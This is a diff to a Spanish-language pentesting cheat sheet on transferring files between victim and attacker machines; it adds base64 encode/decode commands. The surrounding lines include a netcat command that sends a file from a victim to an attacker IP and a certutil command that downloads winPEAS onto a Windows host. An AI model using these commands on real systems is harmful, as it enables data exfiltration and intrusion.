@@ -88,6 +88,14 @@ Enviar ficheros por netcat (Victima)
 ```
 nc -q 0 192.168.16.37 9999 < BurgerWithoutCheese.zip (atacante) nc -nvlp 9999 > BurgerWithoutCheese.zip
 ```
+
+## Enviar el Archivo como Base64
+
+```
+base64 archivo.txt
+base64 -d archivo_codificado.txt > archivo_recibido.txt
+```
+
 ## Compartir ficheros con máquinas Windows:
 ```
 certutil -urlcache -split -f http://192.168.200.3/winPEASx64.exe C:\Users\hacker\Documents\winpeas.exe
